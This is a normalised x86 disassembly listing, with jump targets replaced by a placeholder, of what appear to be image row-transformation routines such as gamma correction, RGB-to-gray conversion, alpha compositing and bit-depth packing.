je r-xdata
mov eax esi
pop esi
pop ebp
add esp 0x2c
retn
movzx esi [ eax + 0x22c ]
push ebx
movzx ebx [ eax + 0x22e ]
push edi
movzx edi [ eax + 0x22a ]
mov [ esp + 0x34 ] edi
mov [ esp + 0x1c ] esi
mov [ esp + 0x30 ] ebx
cmp dl 0x2
jne r-xdata
mov esi [ esp + 0x44 ]
cmp [ ecx + 0x9 ] 0x8
jne r-xdata
add [ ecx + 0xa ] 0xfe
mov al [ ecx + 0x9 ]
mov dl [ ecx + 0xa ]
and [ ecx + 0x8 ] 0xfd
imul dl
pop edi
mov [ ecx + 0xb ] al
cmp al 0x8
pop ebx
movzx eax al
jb r-xdata
cmp [ ecx + 0x9 ] 0x8
jne r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
cmp [ eax + 0x168 ] 0x0
je r-xdata
imul eax ebp
add eax 0x7
shr eax 0x3
pop esi
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x8 ]
pop ebp
add esp 0x2c
retn
shr eax 0x3
imul eax ebp
pop esi
mov [ ecx + 0x4 ] eax
mov eax [ esp + 0x8 ]
pop ebp
add esp 0x2c
retn
cmp [ eax + 0x178 ] 0x0
je r-xdata
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov edx [ esp + 0x44 ]
mov esi edx
test ebp ebp
jbe r-xdata
cmp [ eax + 0x174 ] 0x0
je r-xdata
mov esi [ esp + 0x44 ]
mov [ esp + 0x20 ] esi
test ebp ebp
jbe r-xdata
cmp [ eax + 0x16c ] 0x0
je r-xdata
mov eax esi
mov ecx esi
test ebp ebp
jbe r-xdata
cmp [ eax + 0x174 ] 0x0
je r-xdata
mov eax esi
test ebp ebp
jbe r-xdata
cmp [ eax + 0x16c ] 0x0
je r-xdata
mov [ esp + 0x2c ] ebp
jmp r-xdata
mov edx [ esp + 0x44 ]
mov [ esp + 0x20 ] edx
test ebp ebp
jbe r-xdata
mov [ esp + 0x24 ] ebp
mov esi [ esp + 0x44 ]
mov [ esp + 0x20 ] esi
test ebp ebp
jbe r-xdata
mov ecx [ esp + 0x40 ]
mov [ esp + 0x30 ] ebp
mov ecx esi
mov [ esp + 0x28 ] esi
test ebp ebp
jbe r-xdata
mov [ esp + 0x2c ] ebp
mov edi edi
cmp [ esp + 0x18 ] 0x0
mov ebp esi
jbe r-xdata
movzx ecx [ edx ]
movzx bp [ edx + 0x1 ]
shl cx 0x8
or cx bp
movzx bp [ edx + 0x3 ]
movzx ecx cx
mov [ esp + 0x20 ] ecx
movzx ecx [ edx + 0x2 ]
add edx 0x2
shl cx 0x8
or cx bp
movzx bp [ edx + 0x3 ]
movzx ecx cx
mov [ esp + 0x24 ] ecx
movzx ecx [ edx + 0x2 ]
add edx 0x2
shl cx 0x8
or cx bp
movzx ecx cx
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x20 ]
add edx 0x2
cmp cx [ esp + 0x24 ]
jne r-xdata
mov [ esp + 0x28 ] ebp
movzx edx [ esp + 0x12 ]
movzx ecx cl
imul edx ebx
imul ecx [ esp + 0x1c ]
or [ esp + 0x14 ] 0x1
mov ebp [ esp + 0x20 ]
add edx ecx
movzx ecx [ esp + 0x11 ]
imul ecx edi
add edx ecx
shr edx 0xf
mov [ ebp ] dl
cmp dl [ esp + 0x12 ]
jne r-xdata
cmp [ ecx + 0x8 ] 0x6
jne r-xdata
mov [ esp + 0x24 ] ebp
jmp r-xdata
or [ esp + 0x14 ] 0x1
cmp bp si
je r-xdata
mov [ esp + 0x24 ] ebp
lea esp [ esp ]
or [ esp + 0x14 ] 0x1
cmp cl dl
je r-xdata
mov ebp [ esp + 0x18 ]
mov edx [ esp + 0x18 ]
mov [ esp + 0x2c ] edx
jmp r-xdata
or [ esp + 0x14 ] 0x1
cmp cx [ esp + 0x28 ]
je r-xdata
movzx ebx [ esp + 0x24 ]
movzx ecx [ eax + 0x158 ]
mov [ esp + 0x2c ] ebx
movzx ebx bp
movzx ebp bl
shr ebp cl
movzx edx si
mov esi [ eax + 0x178 ]
mov ebp [ esi + ebp * 4 ]
shr ebx 0x8
movzx ebp [ ebp + ebx * 2 ]
mov ebx [ esp + 0x2c ]
imul ebp edi
movzx edi bl
shr edi cl
shr ebx 0x8
mov edi [ esi + edi * 4 ]
movzx edi [ edi + ebx * 2 ]
imul edi [ esp + 0x1c ]
mov ebx [ esp + 0x30 ]
add ebp edi
movzx edi dl
shr edi cl
shr edx 0x8
mov esi [ esi + edi * 4 ]
movzx edx [ esi + edx * 2 ]
imul edx ebx
mov edi [ esp + 0x34 ]
add ebp edx
shr ebp 0xf
movzx edx bp
movzx esi dl
shr esi cl
mov ecx [ eax + 0x174 ]
shr edx 0x8
or [ esp + 0x14 ] 0x1
mov ecx [ ecx + esi * 4 ]
movzx esi [ ecx + edx * 2 ]
mov edx [ esp + 0x38 ]
cmp bp si
jne r-xdata
movzx ecx [ esi ]
inc esi
movzx edx [ esi + 0x1 ]
mov [ esp + 0x11 ] cl
mov cl [ esi ]
inc esi
mov [ esp + 0x12 ] dl
mov dl [ esp + 0x11 ]
inc esi
mov [ esp + 0x13 ] cl
cmp dl cl
jne r-xdata
jmp r-xdata
mov cl [ esp + 0x13 ]
mov cl [ esi - 0x1 ]
mov ebp [ esp + 0x20 ]
mov [ ebp ] cl
jmp r-xdata
movzx ecx [ esi ]
mov ebp [ eax + 0x16c ]
movzx edx [ ecx + ebp ]
movzx ecx [ esi + 0x1 ]
mov cl [ ecx + ebp ]
inc esi
inc esi
mov [ esp + 0x12 ] dl
movzx edx [ esi ]
movzx edx [ edx + ebp ]
mov [ esp + 0x11 ] dl
mov dl [ esp + 0x12 ]
inc esi
mov [ esp + 0x13 ] cl
cmp dl cl
jne r-xdata
movzx esi [ eax ]
movzx edx [ eax + 0x1 ]
shl si 0x8
or dx si
movzx esi [ eax + 0x2 ]
movzx edx dx
add eax 0x2
movzx bp [ eax + 0x2 ]
mov [ esp + 0x34 ] edx
movzx edx [ eax + 0x1 ]
shl si 0x8
add eax 0x2
or dx si
movzx esi [ eax + 0x1 ]
shl bp 0x8
or si bp
mov ebp [ esp + 0x34 ]
movzx edx dx
add eax 0x2
movzx esi si
cmp bp dx
jne r-xdata
movzx edx dx
imul edx [ esp + 0x1c ]
movzx esi si
imul esi ebx
add esi edx
movzx edx [ esp + 0x34 ]
imul edx edi
add esi edx
shr esi 0xf
movzx esi si
mov edx esi
shr edx 0x8
mov [ ecx ] dl
mov [ esp + 0x38 ] esi
movzx edx [ esp + 0x38 ]
inc ecx
mov [ ecx ] dl
movzx edx [ eax ]
inc ecx
mov [ ecx ] dl
movzx edx [ eax + 0x1 ]
inc eax
inc ecx
mov [ ecx ] dl
inc ecx
inc eax
sub [ esp + 0x30 ] 0x1
jne r-xdata
movzx ebx [ esp + 0x2c ]
movzx ecx [ eax + 0x158 ]
mov esi [ eax + 0x178 ]
mov [ esp + 0x38 ] ebx
movzx ebx bp
movzx ebp bl
shr ebp cl
shr ebx 0x8
movzx edx dx
mov ebp [ esi + ebp * 4 ]
movzx ebp [ ebp + ebx * 2 ]
mov ebx [ esp + 0x38 ]
imul ebp edi
movzx edi bl
shr edi cl
shr ebx 0x8
mov edi [ esi + edi * 4 ]
movzx edi [ edi + ebx * 2 ]
imul edi [ esp + 0x1c ]
add ebp edi
movzx edi dl
shr edi cl
shr edx 0x8
mov esi [ esi + edi * 4 ]
movzx edx [ esi + edx * 2 ]
imul edx [ esp + 0x30 ]
mov edi [ esp + 0x34 ]
add ebp edx
shr ebp 0xf
movzx edx bp
movzx esi dl
shr esi cl
mov ecx [ eax + 0x174 ]
shr edx 0x8
or [ esp + 0x14 ] 0x1
mov ecx [ ecx + esi * 4 ]
movzx edx [ ecx + edx * 2 ]
mov esi [ esp + 0x28 ]
mov ecx [ esp + 0x20 ]
cmp bp dx
jne r-xdata
mov cl [ eax ]
movzx edx [ eax + 0x1 ]
inc eax
inc eax
mov [ esp + 0x12 ] dl
movzx edx [ eax ]
inc eax
mov [ esp + 0x11 ] cl
mov [ esp + 0x13 ] dl
cmp cl [ esp + 0x12 ]
jne r-xdata
jmp r-xdata
movzx ecx [ esp + 0x13 ]
movzx edx [ esp + 0x12 ]
imul ecx ebx
imul edx [ esp + 0x1c ]
add ecx edx
movzx edx [ esp + 0x11 ]
imul edx edi
add ecx edx
shr ecx 0xf
mov [ esi ] cl
mov cl [ eax ]
inc esi
mov [ esi ] cl
inc esi
inc eax
sub [ esp + 0x2c ] 0x1
jne r-xdata
movzx edx [ esi ]
mov ecx [ eax + 0x16c ]
movzx edx [ edx + ecx ]
inc esi
mov [ esp + 0x13 ] dl
movzx edx [ esi ]
movzx edx [ edx + ecx ]
inc esi
mov [ esp + 0x11 ] dl
movzx edx [ esi ]
movzx ecx [ edx + ecx ]
mov [ esp + 0x12 ] cl
mov cl [ esp + 0x13 ]
inc esi
cmp cl [ esp + 0x11 ]
jne r-xdata
mov ecx [ esp + 0x40 ]
mov ebp [ esp + 0x18 ]
movzx ecx [ esp + 0x28 ]
movzx ebp [ esp + 0x24 ]
imul ecx ebx
imul ebp [ esp + 0x1c ]
add ecx ebp
movzx ebp [ esp + 0x20 ]
imul ebp edi
add ecx ebp
shr ecx 0xf
movzx ebp cx
mov ecx ebp
shr ecx 0x8
mov [ esi ] cl
mov [ esp + 0x38 ] ebp
mov cl [ esp + 0x38 ]
inc esi
mov [ esi ] cl
inc esi
sub [ esp + 0x2c ] 0x1
jne r-xdata
movzx ecx [ edx ]
movzx esi [ edx + 0x1 ]
shl cx 0x8
or cx si
movzx esi [ edx + 0x3 ]
movzx ebp cx
movzx ecx [ edx + 0x2 ]
add edx 0x2
shl cx 0x8
or cx si
movzx esi [ edx + 0x3 ]
movzx ecx cx
add edx 0x2
mov [ esp + 0x24 ] ecx
movzx ecx [ edx ]
shl cx 0x8
or cx si
add edx 0x2
movzx esi cx
mov [ esp + 0x38 ] edx
cmp bp [ esp + 0x24 ]
jne r-xdata
jmp r-xdata
movzx esi bp
jmp r-xdata
inc ebp
sub [ esp + 0x24 ] 0x1
mov [ esp + 0x20 ] ebp
jne r-xdata
movzx edx [ esp + 0x11 ]
movzx ecx cl
imul edx ebx
imul ecx [ esp + 0x1c ]
or [ esp + 0x14 ] 0x1
mov ebp [ esp + 0x20 ]
add edx ecx
movzx ecx [ esp + 0x12 ]
imul ecx edi
add edx ecx
mov ecx [ eax + 0x168 ]
shr edx 0xf
mov dl [ edx + ecx ]
mov [ ebp ] dl
cmp dl [ esp + 0x11 ]
jne r-xdata
movzx edx [ ecx ]
movzx ebx [ ecx + 0x1 ]
shl dx 0x8
or dx bx
movzx ebx [ ecx + 0x3 ]
movzx ebp dx
movzx edx [ ecx + 0x2 ]
add ecx 0x2
shl dx 0x8
or dx bx
movzx ebx [ ecx + 0x3 ]
movzx edx dx
mov [ esp + 0x2c ] edx
movzx edx [ ecx + 0x2 ]
add ecx 0x2
shl dx 0x8
or dx bx
add ecx 0x2
movzx edx dx
mov [ esp + 0x20 ] ecx
cmp bp [ esp + 0x2c ]
jne r-xdata
jmp r-xdata
movzx edx bp
jmp r-xdata
or [ esp + 0x14 ] 0x1
cmp cl [ esp + 0x12 ]
je r-xdata
mov ecx esi
mov [ esp + 0x24 ] esi
mov esi [ esp + 0x20 ]
shr ecx 0x8
mov [ esi ] cl
mov cl [ esp + 0x24 ]
inc esi
mov [ esi ] cl
mov ecx 0x1
mov [ esp + 0x20 ] esi
add [ esp + 0x20 ] ecx
sub [ esp + 0x28 ] ecx
jne r-xdata
jmp r-xdata
mov cl [ esp + 0x13 ]
mov cl [ esi - 0x1 ]
mov ebp [ esp + 0x20 ]
mov [ ebp ] cl
jmp r-xdata
mov ebx edx
shr ebx 0x8
mov [ esi ] bl
inc esi
mov [ esi ] dl
movzx edx [ ecx ]
inc esi
mov [ esi ] dl
movzx edx [ ecx + 0x1 ]
inc ecx
inc esi
mov [ esi ] dl
inc esi
inc ecx
sub [ esp + 0x24 ] 0x1
mov [ esp + 0x28 ] esi
jne r-xdata
jmp r-xdata
movzx edx [ esp + 0x12 ]
movzx ecx [ esp + 0x11 ]
imul edx ebx
imul ecx [ esp + 0x1c ]
add edx ecx
movzx ecx [ esp + 0x13 ]
imul ecx edi
add edx ecx
mov ecx [ eax + 0x168 ]
shr edx 0xf
mov dl [ edx + ecx ]
mov [ ebp ] dl
mov cl [ esi ]
inc ebp
mov [ ebp ] cl
inc ebp
inc esi
sub [ esp + 0x2c ] 0x1
jne r-xdata
inc ebp
sub [ esp + 0x24 ] 0x1
mov [ esp + 0x20 ] ebp
jne r-xdata
sub_434580
sub esp 0x10
cmp [ esp + 0x1c ] 0x0
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x34 ]
push ebx
mov bl [ esp + 0x40 ]
push ebp
mov ebp [ esp + 0x28 ]
push esi
mov esi [ eax ]
push edi
mov edi [ esp + 0x40 ]
mov [ esp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov al [ eax + 0x8 ]
test al 0x4
je r-xdata
movzx eax al
cmp eax 0x6
ja r-xdata
cmp al 0x3
je r-xdata
mov edx [ esp + 0x24 ]
mov al [ edx + 0x8 ]
test al 0x4
je r-xdata
jmp [ eax * 4 + jump_table_435610 ]
cmp [ esp + 0x28 ] 0x0
je r-xdata
dec [ edx + 0xa ]
mov cl [ edx + 0xa ]
and al 0xfb
mov [ edx + 0x8 ] al
mov al [ edx + 0x9 ]
imul cl
mov [ edx + 0xb ] al
cmp al 0x8
movzx eax al
jb r-xdata
mov eax [ esp + 0x24 ]
movzx eax [ eax + 0x9 ]
dec eax
cmp eax 0xf
ja r-xdata
mov eax [ esp + 0x24 ]
cmp [ eax + 0x9 ] 0x8
jne r-xdata
mov eax [ esp + 0x24 ]
cmp [ eax + 0x9 ] 0x8
jne r-xdata
mov eax [ esp + 0x24 ]
cmp [ eax + 0x9 ] 0x8
jne r-xdata
imul eax [ esp + 0x10 ]
add eax 0x7
shr eax 0x3
mov [ edx + 0x4 ] eax
shr eax 0x3
imul eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ edx + 0x4 ] eax
pop ebx
add esp 0x10
retn
movzx ecx [ eax + lookup_table_435644 ]
jmp [ ecx * 4 + jump_table_43562c ]
test edi edi
je r-xdata
cmp [ esp + 0x34 ] 0x0
je r-xdata
test edi edi
je r-xdata
cmp [ esp + 0x3c ] 0x0
je r-xdata
test edi edi
je r-xdata
cmp [ esp + 0x3c ] 0x0
je r-xdata
cmp [ esp + 0x10 ] 0x0
mov esi edx
mov edx 0x7
jbe r-xdata
cmp [ esp + 0x34 ] 0x0
mov esi edx
mov edx 0x6
je r-xdata
cmp [ esp + 0x34 ] 0x0
mov esi edx
mov edx 0x4
je r-xdata
cmp [ esp + 0x34 ] 0x0
je r-xdata
test edi edi
je r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
cmp [ esp + 0x10 ] 0x0
mov esi edx
jbe r-xdata
test ecx ecx
je r-xdata
cmp [ esp + 0x10 ] 0x0
mov ecx edx
mov esi edx
jbe r-xdata
cmp [ esp + 0x38 ] 0x0
je r-xdata
test esi esi
jbe r-xdata
test ecx ecx
je r-xdata
test esi esi
jbe r-xdata
cmp [ esp + 0x38 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
mov edi [ esp + 0x2c ]
mov ebp [ esp + 0x28 ]
mov [ esp + 0x18 ] eax
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
jbe r-xdata
cmp [ esp + 0x10 ] 0x0
jbe r-xdata
cmp [ esp + 0x10 ] 0x0
jbe r-xdata
cmp [ esp + 0x10 ] 0x0
jbe r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
mov edi [ esp + 0x2c ]
mov eax esi
mov esi [ esp + 0x28 ]
add edx 0x2
lea ebx [ ebx ]
mov ebp [ esp + 0x28 ]
lea eax [ edx + 0x2 ]
mov edx esi
mov [ esp + 0x14 ] edx
mov edi edi
mov edi [ esp + 0x2c ]
mov eax esi
mov esi [ esp + 0x28 ]
add edx 0x2
jmp r-xdata
mov ebp [ esp + 0x2c ]
mov edi [ esp + 0x28 ]
mov ecx esi
mov esi [ esp + 0x34 ]
add edx 0x2
jmp r-xdata
mov edi [ esp + 0x10 ]
lea ecx [ edx + 0x3 ]
mov edx [ esp + 0x2c ]
cmp [ esp + 0x48 ] 0x0
je r-xdata
mov edi [ esp + 0x10 ]
cmp [ esp + 0x34 ] 0x0
je r-xdata
lea eax [ edx + 0x2 ]
lea ecx [ edx + 0x7 ]
mov edx esi
mov esi [ esp + 0x2c ]
mov [ esp + 0x1c ] edx
mov edi edi
cmp [ esp + 0x48 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x2c ]
lea esi [ edx + 0x2 ]
lea edi [ edx + 0x1 ]
mov [ esp + 0x18 ] eax
jmp r-xdata
cmp [ esp + 0x34 ] 0x0
je r-xdata
mov bl [ esi ]
mov cl dl
mov al bl
shr al cl
and al 0x1
movzx cx al
cmp cx [ ebp + 0x8 ]
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x2c ]
mov ebp [ esp + 0x28 ]
mov [ esp + 0x18 ] ecx
mov ebp [ esp + 0x10 ]
mov edi [ esp + 0x28 ]
nop
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x2c ]
mov ebp [ esp + 0x28 ]
mov [ esp + 0x18 ] ecx
lea esp [ esp ]
mov ebp [ esp + 0x10 ]
mov edi [ esp + 0x28 ]
mov edi [ esp + 0x28 ]
mov eax esi
mov esi [ esp + 0x2c ]
mov ebp [ esp + 0x2c ]
mov edi [ esp + 0x28 ]
mov ecx esi
mov esi [ esp + 0x34 ]
lea esp [ esp ]
mov edi [ esp + 0x28 ]
mov eax esi
mov esi [ esp + 0x2c ]
nop
mov eax esi
mov [ esp + 0x18 ] eax
add edx 0x6
sub eax 0x1
jne r-xdata
movzx cx [ edx ]
mov ebx 0x100
imul cx bx
movzx bx [ edx + 0x1 ]
add cx bx
cmp cx [ esi + 0x4 ]
jne r-xdata
movzx esi cl
movzx edx bl
mov cl dl
shr esi cl
movzx ecx [ eax - 0x2 ]
mov esi [ edi + esi * 4 ]
movzx esi [ esi + ecx * 2 ]
mov ecx esi
shr ecx 0x8
mov [ eax - 0x2 ] cl
mov [ esp + 0x18 ] esi
movzx ecx [ esp + 0x18 ]
movzx esi [ eax + 0x1 ]
mov [ eax - 0x1 ] cl
mov cl dl
shr esi cl
movzx ecx [ eax ]
mov esi [ edi + esi * 4 ]
movzx esi [ esi + ecx * 2 ]
mov ecx esi
shr ecx 0x8
mov [ esp + 0x18 ] esi
movzx esi [ eax + 0x3 ]
mov [ eax ] cl
movzx ecx [ esp + 0x18 ]
mov [ eax + 0x1 ] cl
mov cl dl
movzx edx [ eax + 0x2 ]
shr esi cl
mov ecx [ edi + esi * 4 ]
movzx ecx [ ecx + edx * 2 ]
mov edx ecx
shr edx 0x8
mov [ eax + 0x2 ] dl
mov [ eax + 0x3 ] cl
movzx dx [ eax ]
mov esi 0x100
imul dx si
movzx si [ eax + 0x1 ]
add dx si
cmp dx [ ebp + 0x4 ]
jne r-xdata
movzx cx [ edx - 0x2 ]
cmp cx [ esi + 0x2 ]
jne r-xdata
mov al [ edx - 0x2 ]
movzx bx al
cmp bx [ edi + 0x2 ]
jne r-xdata
test ax ax
jne r-xdata
mov ax [ ecx - 0x3 ]
mov [ esi ] ax
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
mov esi edx
jbe r-xdata
test al al
jne r-xdata
mov dl [ ecx ]
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
mov ecx edx
mov esi edx
jbe r-xdata
test dx dx
jne r-xdata
mov edx [ ecx - 0x7 ]
mov [ eax - 0x2 ] edx
mov dx [ ecx - 0x3 ]
mov [ eax + 0x2 ] dx
jmp r-xdata
test esi esi
jbe r-xdata
mov al [ edi + 0x2 ]
cmp al 0xff
jne r-xdata
test esi esi
jbe r-xdata
test edx edx
jne r-xdata
mov ecx 0x7
sub ecx edx
mov eax 0x7f7f
sar eax cl
mov ecx edx
and al bl
mov [ esi ] al
mov bl [ edi + 0x8 ]
shl bl cl
or bl al
mov [ esi ] bl
test edx edx
jne r-xdata
mov ecx 0x6
sub ecx edx
mov eax 0x3f3f
sar eax cl
mov ecx edx
and al bl
mov [ esi ] al
mov bl [ edi + 0x8 ]
shl bl cl
or bl al
mov [ esi ] bl
movzx eax al
lea ecx [ eax * 4 ]
or ecx eax
add ecx ecx
add ecx ecx
or ecx eax
add ecx ecx
add ecx ecx
or ecx eax
mov eax [ esp + 0x34 ]
mov al [ ecx + eax ]
mov ecx 0x6
sub ecx edx
mov ebx 0x3f3f
sar ebx cl
shr al 0x6
mov ecx edx
and bl [ esi ]
shl al cl
mov ecx 0x6
sub ecx edx
mov eax 0x3f3f
sar eax cl
mov ecx [ esp + 0x2c ]
and al bl
mov [ esi ] al
mov bl [ ecx + 0x8 ]
mov ecx edx
shl bl cl
jmp r-xdata
test edx edx
jne r-xdata
mov ecx 0x4
sub ecx edx
mov eax 0xf0f
sar eax cl
mov ecx edx
and al bl
mov [ esi ] al
mov bl [ edi + 0x8 ]
shl bl cl
or bl al
mov [ esi ] bl
movzx eax al
mov ecx eax
shl ecx 0x4
or ecx eax
mov eax [ esp + 0x34 ]
mov al [ ecx + eax ]
mov ecx 0x4
sub ecx edx
mov ebx 0xf0f
sar ebx cl
shr al 0x4
mov ecx edx
and bl [ esi ]
shl al cl
mov ecx 0x4
sub ecx edx
mov eax 0xf0f
sar eax cl
mov ecx [ esp + 0x2c ]
and al bl
mov [ esi ] al
mov bl [ ecx + 0x8 ]
mov ecx edx
shl bl cl
jmp r-xdata
inc edx
sub eax 0x1
jne r-xdata
mov cl [ esi + 0x8 ]
mov [ edx ] cl
movzx eax al
mov al [ eax + esi ]
mov al [ ebp + 0x8 ]
jmp r-xdata
add edx 0x2
sub eax 0x1
jne r-xdata
movzx ecx [ esi + 0x9 ]
mov [ edx ] cl
movzx ecx [ esi + 0x8 ]
mov [ edx + 0x1 ] cl
movzx esi cl
mov cl bl
shr esi cl
movzx ecx al
mov eax [ edi + esi * 4 ]
movzx eax [ eax + ecx * 2 ]
mov ecx eax
shr ecx 0x8
mov [ edx ] cl
mov esi [ esp + 0x2c ]
mov cl [ esi + 0x9 ]
mov [ edx ] cl
mov al [ esi + 0x8 ]
jmp r-xdata
movzx cx [ edx - 0x2 ]
mov ebx 0x100
imul cx bx
movzx bx [ edx - 0x1 ]
add cx bx
cmp cx [ esi + 0x2 ]
jne r-xdata
jmp r-xdata
movzx cx [ edx + 0x2 ]
mov ebx 0x100
imul cx bx
movzx bx [ edx + 0x3 ]
add cx bx
cmp cx [ esi + 0x6 ]
jne r-xdata
mov dl [ eax - 0x2 ]
mov cl [ eax - 0x1 ]
movzx dx dl
mov esi 0x100
imul dx si
movzx si cl
add dx si
cmp dx [ ebp + 0x2 ]
jne r-xdata
jmp r-xdata
movzx dx [ eax + 0x2 ]
mov esi 0x100
imul dx si
movzx si [ eax + 0x3 ]
add dx si
cmp dx [ ebp + 0x6 ]
jne r-xdata
add edx 0x3
sub eax 0x1
jne r-xdata
movzx cx [ edx - 0x1 ]
cmp cx [ esi + 0x4 ]
jne r-xdata
movzx eax al
movzx eax [ eax + esi ]
mov [ edx - 0x2 ] al
movzx eax [ edx - 0x1 ]
movzx eax [ eax + esi ]
mov [ edx - 0x1 ] al
movzx eax [ edx ]
movzx eax [ eax + esi ]
movzx bx [ edx - 0x1 ]
cmp bx [ edi + 0x4 ]
jne r-xdata
movzx dx [ ecx - 0x3 ]
mov ebx 0x100
imul dx bx
movzx bx [ ecx - 0x2 ]
add dx bx
movzx ebx [ ebp + 0x8 ]
movzx eax ax
movzx edx dx
imul edx eax
mov ebp 0xffff
sub ebp eax
imul ebx ebp
mov ebp [ esp + 0x30 ]
lea edx [ edx + ebx + 0x8000 ]
mov eax edx
shr eax 0x10
add eax edx
shr eax 0x10
mov edx eax
shr edx 0x8
mov [ esi ] dl
mov edx [ esp + 0x2c ]
movzx eax [ edx + 0x9 ]
mov [ esi ] al
movzx eax [ edx + 0x8 ]
jmp r-xdata
add ecx 0x4
add esi 0x2
sub edi 0x1
jne r-xdata
mov eax [ esp + 0x10 ]
inc edx
mov [ esp + 0x18 ] eax
lea esp [ esp ]
movzx bx [ ecx ]
movzx ax al
mov edx 0xff
imul bx ax
sub edx eax
imul dx [ ebp + 0x8 ]
add dx bx
mov eax 0x80
add dx ax
movzx eax dx
mov edx eax
shr edx 0x8
add edx eax
sar edx 0x8
mov eax [ esp + 0x2c ]
mov dl [ eax + 0x8 ]
jmp r-xdata
mov [ esi ] dl
add ecx 0x2
inc esi
sub edi 0x1
jne r-xdata
mov edx [ esp + 0x10 ]
mov edi [ esp + 0x3c ]
mov [ esp + 0x18 ] edx
jmp r-xdata
movzx esi [ ecx - 0x5 ]
mov edi 0x100
imul si di
movzx edi [ ecx - 0x4 ]
add si di
movzx esi si
mov [ esp + 0x18 ] esi
movzx esi [ ecx - 0x3 ]
mov edi 0x100
imul si di
movzx edi [ ecx - 0x2 ]
mov ebp [ esp + 0x2c ]
add si di
movzx esi si
mov [ esp + 0x14 ] esi
movzx esi dx
movzx dx [ ecx - 0x7 ]
mov ebx 0x100
imul dx bx
movzx bx [ ecx - 0x6 ]
add dx bx
movzx ebx [ ebp + 0x2 ]
movzx edx dx
imul edx esi
mov edi 0xffff
sub edi esi
imul ebx edi
lea ebx [ edx + ebx + 0x8000 ]
mov edx ebx
shr edx 0x10
add edx ebx
shr edx 0x10
mov ebx edx
mov [ eax - 0x1 ] dl
shr ebx 0x8
mov [ eax - 0x2 ] bl
movzx edx [ ebp + 0x4 ]
movzx ebx [ esp + 0x18 ]
imul edx edi
imul ebx esi
lea ebx [ edx + ebx + 0x8000 ]
mov edx ebx
shr edx 0x10
add edx ebx
shr edx 0x10
mov ebx edx
mov [ eax + 0x1 ] dl
shr ebx 0x8
mov [ eax ] bl
movzx edx [ ebp + 0x6 ]
imul edx edi
movzx edi [ esp + 0x14 ]
imul edi esi
lea esi [ edx + edi + 0x8000 ]
mov edx esi
shr edx 0x10
add edx esi
shr edx 0x10
mov ebx edx
shr ebx 0x8
mov [ eax + 0x2 ] bl
mov esi ebp
movzx edx [ esi + 0x3 ]
mov [ eax - 0x2 ] dl
movzx edx [ esi + 0x2 ]
mov [ eax - 0x1 ] dl
movzx edx [ esi + 0x5 ]
mov [ eax ] dl
movzx edx [ esi + 0x4 ]
mov [ eax + 0x1 ] dl
movzx edx [ esi + 0x7 ]
mov [ eax + 0x2 ] dl
movzx edx [ esi + 0x6 ]
jmp r-xdata
add ecx 0x8
add eax 0x6
sub [ esp + 0x1c ] 0x1
jne r-xdata
mov ecx esi
lea eax [ edx + 0x2 ]
inc edx
mov [ esp + 0x1c ] ecx
jmp r-xdata
test al al
jne r-xdata
movzx edx [ edi - 0x1 ]
mov [ esi - 0x2 ] dl
mov al [ edi ]
mov [ esi - 0x1 ] al
movzx edx [ edi + 0x1 ]
mov [ esi ] dl
jmp r-xdata
mov ecx [ esp + 0x10 ]
lea esi [ edx + 0x2 ]
lea edi [ edx + 0x1 ]
mov edx [ esp + 0x2c ]
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x34 ]
mov edi edi
dec edx
mov edx 0x7
inc esi
jmp r-xdata
sub edx 0x2
mov edx 0x6
inc esi
jmp r-xdata
sub edx 0x2
mov edx 0x6
inc esi
jmp r-xdata
or bl al
mov [ esi ] bl
test edx edx
jne r-xdata
sub edx 0x4
mov edx 0x4
inc esi
jmp r-xdata
sub edx 0x4
mov edx 0x4
inc esi
jmp r-xdata
or bl al
mov [ esi ] bl
test edx edx
jne r-xdata
movzx cx [ edx ]
cmp cx [ edi + 0x8 ]
jne r-xdata
jmp r-xdata
mov al [ edx ]
movzx bx al
cmp bx [ edi + 0x8 ]
jne r-xdata
jmp r-xdata
mov [ edx ] al
inc edx
sub ecx 0x1
jne r-xdata
movzx cx [ edx ]
mov ebx 0x100
imul cx bx
movzx bx [ edx + 0x1 ]
add cx bx
cmp cx [ edi + 0x8 ]
jne r-xdata
jmp r-xdata
mov al [ edx ]
mov cl [ edx + 0x1 ]
movzx si al
mov ebp 0x100
imul si bp
movzx bp cl
add si bp
mov ebp [ esp + 0x28 ]
cmp si [ ebp + 0x8 ]
jne r-xdata
jmp r-xdata
mov [ edx + 0x1 ] al
add edx 0x2
sub [ esp + 0x18 ] 0x1
jne r-xdata
movzx ecx [ edi + 0x3 ]
mov [ edx - 0x2 ] cl
movzx ecx [ edi + 0x2 ]
mov [ edx - 0x1 ] cl
movzx ecx [ edi + 0x5 ]
mov [ edx ] cl
movzx ecx [ edi + 0x4 ]
mov [ edx + 0x1 ] cl
movzx ecx [ edi + 0x7 ]
mov [ edx + 0x2 ] cl
movzx ecx [ edi + 0x6 ]
mov [ edx + 0x3 ] cl
mov esi [ esp + 0x2c ]
movzx ecx [ esi + 0x3 ]
mov [ eax - 0x2 ] cl
movzx edx [ esi + 0x2 ]
mov [ eax - 0x1 ] dl
movzx ecx [ esi + 0x5 ]
mov [ eax ] cl
movzx edx [ esi + 0x4 ]
mov [ eax + 0x1 ] dl
movzx ecx [ esi + 0x7 ]
mov [ eax + 0x2 ] cl
movzx edx [ esi + 0x6 ]
mov [ eax + 0x3 ] dl
jmp r-xdata
jmp r-xdata
movzx cx [ edx ]
cmp cx [ esi + 0x6 ]
jne r-xdata
jmp r-xdata
